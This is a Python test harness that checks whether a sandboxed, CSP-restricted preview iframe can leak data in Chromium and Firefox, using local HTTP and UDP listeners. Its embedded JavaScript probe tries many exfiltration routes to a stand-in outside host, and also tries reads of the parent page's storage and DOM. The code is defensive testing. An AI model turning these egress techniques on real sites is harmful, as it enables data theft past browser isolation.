"""Probe preview containment with real HTTP and UDP listeners in Chromium and Firefox.

Run with `uv run python bench/web_preview_containment.py --output FILE`.
A nonzero exit preserves the no-egress requirement when a browser permits an exit.
"""

from __future__ import annotations

import argparse
import contextlib
import dataclasses
import http.server
import json
import os
import pathlib
import secrets
import socket
import socketserver
import tempfile
import threading
from collections.abc import Generator
from urllib import parse

from playwright import sync_api

PROBES = (
    "api",
    "fetch",
    "font",
    "form",
    "image",
    "popup",
    "preconnect",
    "prefetch",
    "script",
    "self-navigation",
    "storage",
    "stylesheet",
    "top-navigation",
    "webrtc",
    "websocket",
    "xhr",
)

_SCRIPT = """
(async () => {
  const outside = OUTSIDE, app = APP, probe = PROBE;
  window.probeStarted = true;
  const sample = await fetch('sample.txt').then(r => r.text());
  window.repositoryRead = sample;
  console.info('probe ready: ' + sample);
  const url = outside + '/' + probe + '?sample=' + encodeURIComponent(sample);
  const add = (tag, attrs) => {
    const node = document.createElement(tag);
    Object.assign(node, attrs); document.body.append(node); return node;
  };
  const ignore = promise => promise.catch(() => {});
  switch (probe) {
    case 'api': ignore(fetch(app + '/api/meta')); break;
    case 'fetch': ignore(fetch(url, {mode:'no-cors'})); break;
    case 'font':
      add('style', {textContent:'@font-face {font-family:outside;src:url(' + url + ')} body {font-family:outside}'});
      document.body.append('Font probe'); break;
    case 'form': add('form', {action:url, method:'GET'}).submit(); break;
    case 'image': add('img', {src:url}); break;
    case 'popup': window.open(url, '_blank'); break;
    case 'preconnect': add('link', {rel:'preconnect', href:outside}); break;
    case 'prefetch': add('link', {rel:'prefetch', href:url}); break;
    case 'script': add('script', {src:url}); break;
    case 'self-navigation': location.href = url; break;
    case 'storage': {
      const results = [];
      const readers = [() => localStorage.getItem('a6-token'), () => document.cookie];
      if (parent !== window) readers.push(() => parent.localStorage.getItem('a6-token'),
                                         () => parent.document.body.innerHTML);
      for (const read of readers) {
        try { results.push('READ: ' + read()); }
        catch (e) { results.push(e.name); }
      }
      window.storageResults = results;
      break;
    }
    case 'stylesheet': add('link', {rel:'stylesheet', href:url}); break;
    case 'top-navigation':
      try { top.location.href = url; } catch (e) { window.navigationError = e.name; }
      break;
    case 'webrtc': {
      const rtc = new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:STUN_PORT'}]});
      window.rtc = rtc;
      rtc.createDataChannel('probe');
      await rtc.setLocalDescription(await rtc.createOffer());
      break;
    }
    case 'websocket': {
      const ws = new WebSocket(url.replace('http:', 'ws:'));
      ws.onerror = () => {}; break;
    }
    case 'xhr': {
      const xhr = new XMLHttpRequest(); xhr.open('GET', url); xhr.send(); break;
    }
  }
  window.probeFinished = true;
})().catch(e => { console.info('probe error: ' + e.name + ': ' + e.message); });
"""


class OutsideServer(http.server.ThreadingHTTPServer):
    """Count TCP connections even when a preconnect sends no HTTP request."""

    def __init__(self) -> None:
        super().__init__(("127.0.0.1", 0), OutsideHandler)
        self.hits: list[str] = []

    def get_request(self) -> tuple[socket.socket, tuple[str, int]]:
        connection, address = super().get_request()
        self.hits.append("TCP connection")
        connection.settimeout(1)
        return connection, address


class OutsideHandler(http.server.BaseHTTPRequestHandler):
    """Record each request to the outside server."""

    def do_GET(self) -> None:
        """Record a received request without redirecting it."""
        assert isinstance(self.server, OutsideServer)
        self.server.hits.append(self.path)
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def log_message(self, format: str, *args: object) -> None:
        """Keep the evidence in the JSON report."""


class StunServer(socketserver.ThreadingUDPServer):
    """Count ICE binding requests without answering them."""

    def __init__(self) -> None:
        super().__init__(("127.0.0.1", 0), StunHandler)
        self.hits: list[str] = []


class StunHandler(socketserver.DatagramRequestHandler):
    """Record a real UDP datagram from the browser."""

    def handle(self) -> None:
        """Keep the datagram's bytes as evidence."""
        assert isinstance(self.server, StunServer)
        self.server.hits.append(self.packet.hex())

    def finish(self) -> None:
        """Send no UDP response."""


class PreviewServer(http.server.ThreadingHTTPServer):
    """Serve a policy fixture, not an agent6 preview route."""

    def __init__(self, outside: OutsideServer, stun: StunServer, *, extra_policy: str) -> None:
        super().__init__(("127.0.0.1", 0), PreviewHandler)
        self.origin = f"http://127.0.0.1:{self.server_port}"
        self.preview = f"{self.origin}/preview/{secrets.token_urlsafe(24)}/"
        self.outside = f"http://127.0.0.1:{outside.server_port}"
        self.stun_port = stun.server_address[1]
        self.api_calls: list[str] = []
        sources = "; ".join(
            f"{directive} {self.preview}"
            for directive in ("connect-src", "font-src", "img-src", "media-src")
        )
        self.policy = (
            "sandbox allow-scripts; default-src 'none'; frame-ancestors 'self'; "
            "form-action 'none'; base-uri 'none'; object-src 'none'; frame-src 'none'; "
            f"script-src 'unsafe-inline' {self.preview}; style-src 'unsafe-inline' {self.preview}; "
            f"{sources}{extra_policy}"
        )


class PreviewHandler(http.server.BaseHTTPRequestHandler):
    """Serve the preview document and asset under the proposed policies."""

    def do_GET(self) -> None:
        """Serve the UI shell, one preview document, one text asset or an API refusal."""
        assert isinstance(self.server, PreviewServer)
        query = parse.parse_qs(parse.urlsplit(self.path).query)
        probe = query.get("probe", ["storage"])[0]
        if probe not in PROBES:
            self.send_error(404)
            return
        is_preview = self.path.startswith(parse.urlsplit(self.server.preview).path)
        policy = (
            self.server.policy
            if is_preview
            else (
                "default-src 'none'; script-src 'unsafe-inline'; "
                f"frame-src {self.server.preview}; frame-ancestors 'none'"
            )
        )
        status = 200
        content_type = "text/html; charset=utf-8"
        if self.path.startswith("/api/"):
            self.server.api_calls.append(self.path)
            status, text = 401, "not signed in"
        elif is_preview and self.path.split("?")[0].endswith("sample.txt"):
            text, content_type = "repository-sample", "text/plain; charset=utf-8"
        elif is_preview:
            script = (
                _SCRIPT.replace("OUTSIDE", json.dumps(self.server.outside))
                .replace("APP", json.dumps(self.server.origin))
                .replace("PROBE", json.dumps(probe))
                .replace("STUN_PORT", str(self.server.stun_port))
            )
            text = f"<!doctype html><body>Preview probe<script>{script}</script>"
        else:
            frame = (
                ""
                if "empty" in query
                else (
                    '<iframe sandbox="allow-scripts" '
                    f'src="{self.server.preview}index.html?probe={probe}"></iframe>'
                )
            )
            text = (
                "<!doctype html><body><script>"
                "localStorage.setItem('a6-token', 'test-sentinel-not-a-credential');"
                f"</script>{frame}"
            )
        data = text.encode()
        self.send_response(status)
        for name, value in {
            "Access-Control-Allow-Origin": "*" if is_preview else self.server.origin,
            "Cache-Control": "no-store",
            "Content-Length": str(len(data)),
            "Content-Security-Policy": policy,
            "Content-Type": content_type,
            "Referrer-Policy": "no-referrer",
            "X-Content-Type-Options": "nosniff",
        }.items():
            self.send_header(name, value)
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, format: str, *args: object) -> None:
        """Keep the evidence in the JSON report."""


@contextlib.contextmanager
def serving(server: socketserver.BaseServer) -> Generator[None]:
    """Run one listener until the probe closes."""
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield
    finally:
        server.shutdown()
        server.server_close()
        thread.join()


@dataclasses.dataclass(frozen=True, slots=True)
class Result:
    """The observed browser traffic and storage checks for one probe."""

    browser: str
    version: str
    mode: str
    probe: str
    http: tuple[str, ...]
    udp: tuple[str, ...]
    api: tuple[str, ...]
    storage: tuple[str, ...]
    console: tuple[str, ...]
    policy: str

    @property
    def escaped(self) -> bool:
        """Return whether a listener received traffic or UI storage was read."""
        return bool(
            self.http or self.udp or self.api or any(s.startswith("READ:") for s in self.storage)
        )


def run_probe(
    browser: sync_api.Browser, engine: str, mode: str, probe: str, extra_policy: str
) -> Result:
    """Run the loaded page's own script without intercepting browser traffic."""
    outside, stun = OutsideServer(), StunServer()
    app = PreviewServer(outside, stun, extra_policy=extra_policy)
    console: list[str] = []
    storage: tuple[str, ...] = ()
    with serving(outside), serving(stun), serving(app), browser.new_context() as context:
        page = context.new_page()
        page.on("console", lambda message: console.append(message.text))
        page.goto(app.origin + (f"/?probe={probe}" if mode == "frame" else "/?empty=1"))
        if mode == "tab":
            page.goto(f"{app.preview}index.html?probe={probe}")
        page.wait_for_timeout(3000 if probe == "webrtc" else 1000)
        assert "probe ready: repository-sample" in console, "the probe could not read its asset"
        if probe == "storage":
            target = page if mode == "tab" else page.frames[1]
            storage = tuple(target.evaluate("window.storageResults"))
            assert len(storage) == (2 if mode == "tab" else 4), "the storage probe did not run"
        result = Result(
            engine,
            browser.version,
            mode,
            probe,
            tuple(outside.hits),
            tuple(stun.hits),
            tuple(app.api_calls),
            storage,
            tuple(console),
            app.policy,
        )
    return result


def main() -> None:
    """Record each probe and fail if any required containment check fails."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--output", type=pathlib.Path, required=True)
    parser.add_argument("--probe", action="append", choices=PROBES, help="repeat to select probes")
    parser.add_argument(
        "--extra-policy", default="", help="extra CSP directives, prefixed with '; '"
    )
    args = parser.parse_args()
    output = args.output.resolve()
    results: list[Result] = []
    with tempfile.TemporaryDirectory(prefix="agent6-preview-probe-") as work:
        os.chdir(work)
        with sync_api.sync_playwright() as pw:
            for engine in (pw.chromium, pw.firefox):
                with engine.launch() as browser:
                    for mode in ("frame", "tab"):
                        for probe in args.probe or PROBES:
                            result = run_probe(browser, engine.name, mode, probe, args.extra_policy)
                            results.append(result)
                            print(
                                engine.name,
                                browser.version,
                                mode,
                                probe,
                                "ESCAPED" if result.escaped else "no traffic",
                                flush=True,
                            )
                            output.write_text(
                                json.dumps([dataclasses.asdict(r) for r in results], indent=2)
                                + "\n"
                            )
    escaped = [f"{r.browser}/{r.mode}/{r.probe}" for r in results if r.escaped]
    assert not escaped, f"preview containment failed: {', '.join(escaped)}; evidence: {output}"


if __name__ == "__main__":
    main()
